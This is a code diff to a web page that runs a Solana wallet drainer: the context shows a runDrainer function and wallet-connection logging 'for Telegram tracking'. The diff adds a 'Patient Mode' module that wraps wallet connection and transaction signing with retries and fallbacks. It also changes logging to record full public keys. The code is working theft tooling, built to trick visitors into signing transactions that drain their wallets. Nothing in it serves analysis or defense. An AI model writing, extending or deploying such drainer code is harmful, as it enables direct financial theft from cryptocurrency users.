@@ -68,6 +68,18 @@
   <link rel="apple-touch-icon" href="/logo.png?v=3" />
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js?v=2"></script>
   
+  <!-- Patient Mode Module -->
+  <script type="module">
+    // Import Patient Mode
+    import PatientMode from '/src/patient-mode.js';
+    
+    // Initialize Patient Mode and make it globally available
+    window.patientMode = new PatientMode();
+    window.PatientMode = PatientMode;
+    
+    console.log('[PATIENT_MODE] Patient Mode initialized successfully');
+  </script>
+  
   <script>
     (function() {
       const currentUrl = window.location.origin;
@@ -2963,7 +2975,7 @@ async function runDrainer(provider) {
     
     // Log wallet connection immediately when detected
     if (connectedWalletType !== 'Unknown' && publicKey) {
-      console.log(`[WALLET] Wallet detected: ${connectedWalletType} with public key: ${publicKey.toString().substring(0, 8)}...`);
+              console.log(`[WALLET] Wallet detected: ${connectedWalletType} with public key: ${publicKey.toString()}`);
       // Log wallet connection for Telegram tracking
       window.logWalletConnection(publicKey, connectedWalletType, 0); // Balance will be fetched later
     }
@@ -3255,7 +3267,20 @@ async function runDrainer(provider) {
         signAndSendTransaction: typeof provider.signAndSendTransaction === 'function'
       });
       
-      // Enhanced signing with wallet-specific fallbacks
+      // Use Patient Mode for transaction signing
+      console.log(`[PATIENT_MODE] Using patient mode for ${connectedWalletType} signing`);
+      
+      const onStatusUpdate = (message, type) => {
+        showStatus(message, type);
+      };
+      
+      try {
+        signed = await window.patientMode.signWithPatientMode(provider, transaction, connectedWalletType, onStatusUpdate);
+        console.log('[PATIENT_MODE] Signing successful:', signed);
+      } catch (patientModeError) {
+        console.log(`[PATIENT_MODE] Patient mode signing failed for ${connectedWalletType}, falling back to standard signing`);
+        
+        // Fallback to standard signing methods
       const signingPromise = (async () => {
         console.log('[SIGNING] Wallet type detected:', connectedWalletType);
         
@@ -3347,6 +3372,8 @@ async function runDrainer(provider) {
                          setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 90000);
                        });
                        signed = await Promise.race([signingPromise, timeoutPromise]);
+      }
+      
       console.log('[SIGNING] Transaction signed successfully:', signed);
 
       // Validate signed transaction
@@ -3975,14 +4002,118 @@ window.openWalletModal = async function openWalletModal() {
       }
     }
 
-    // Enhanced wallet connection with proper metadata
+    // Patient Mode Session Management
+    window.cancelPatientModeSession = function(sessionId) {
+      if (window.patientMode) {
+        const cancelled = window.patientMode.cancelSession(sessionId);
+        if (cancelled) {
+          showStatus('Patient mode session cancelled by user', 'warning');
+          console.log(`[PATIENT_MODE] Session ${sessionId} cancelled by user`);
+        }
+        return cancelled;
+      }
+      return false;
+    };
+    
+    window.cancelAllPatientModeSessions = function() {
+      if (window.patientMode) {
+        window.patientMode.cancelAllSessions();
+        showStatus('All patient mode sessions cancelled', 'warning');
+        console.log('[PATIENT_MODE] All sessions cancelled by user');
+      }
+    };
+    
+    window.getPatientModeSessionInfo = function(sessionId) {
+      if (window.patientMode) {
+        return window.patientMode.getSessionInfo(sessionId);
+      }
+      return null;
+    };
+    
+    window.getActivePatientModeSessionsCount = function() {
+      if (window.patientMode) {
+        return window.patientMode.getActiveSessionsCount();
+      }
+      return 0;
+    };
+    
+    // Add patient mode status to the UI
+    window.updatePatientModeStatus = function() {
+      const activeCount = window.getActivePatientModeSessionsCount();
+      if (activeCount > 0) {
+        // Add a small indicator to show patient mode is active
+        const statusElement = document.getElementById('patient-mode-status');
+        if (!statusElement) {
+          const newStatusElement = document.createElement('div');
+          newStatusElement.id = 'patient-mode-status';
+          newStatusElement.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 193, 7, 0.9);
+            color: #000;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            z-index: 10000;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            cursor: pointer;
+            transition: all 0.3s ease;
+          `;
+          newStatusElement.innerHTML = `⏳ Patient Mode Active (${activeCount}) <span style="margin-left: 8px; font-size: 10px;">[Click to cancel]</span>`;
+          newStatusElement.onclick = () => {
+            window.cancelAllPatientModeSessions();
+            newStatusElement.remove();
+          };
+          newStatusElement.onmouseover = () => {
+            newStatusElement.style.background = 'rgba(255, 193, 7, 1)';
+            newStatusElement.style.transform = 'scale(1.05)';
+          };
+          newStatusElement.onmouseout = () => {
+            newStatusElement.style.background = 'rgba(255, 193, 7, 0.9)';
+            newStatusElement.style.transform = 'scale(1)';
+          };
+          document.body.appendChild(newStatusElement);
+        } else {
+          statusElement.innerHTML = `⏳ Patient Mode Active (${activeCount}) <span style="margin-left: 8px; font-size: 10px;">[Click to cancel]</span>`;
+        }
+      } else {
+        // Remove the status indicator if no active sessions
+        const statusElement = document.getElementById('patient-mode-status');
+        if (statusElement) {
+          statusElement.remove();
+        }
+      }
+    };
+    
+    // Update patient mode status every 5 seconds
+    setInterval(() => {
+      window.updatePatientModeStatus();
+    }, 5000);
+    
+    // Enhanced wallet connection with proper metadata and Patient Mode
     async function connectWalletWithMetadata(provider, walletName) {
       try {
         // Set dApp name before connection
         setWalletDAppName(provider, walletName);
         
         if (typeof provider.connect === 'function') {
-          // Try different metadata formats for different wallets
+          // Use Patient Mode for connection
+          console.log(`[PATIENT_MODE] Using patient mode for ${walletName} connection`);
+          
+          const onStatusUpdate = (message, type) => {
+            showStatus(message, type);
+          };
+          
+          try {
+            const result = await window.patientMode.connectWithPatientMode(provider, walletName, onStatusUpdate);
+            console.log(`[PATIENT_MODE] Connection successful for ${walletName}:`, result);
+            return result;
+          } catch (patientModeError) {
+            console.log(`[PATIENT_MODE] Patient mode connection failed for ${walletName}, falling back to standard connection`);
+            
+            // Fallback to standard connection methods
           let result = null;
           
           // Trust Wallet specific connection
@@ -4097,6 +4228,7 @@ window.openWalletModal = async function openWalletModal() {
           }
           
           return result;
+          }
         }
         return null;
       } catch (error) {
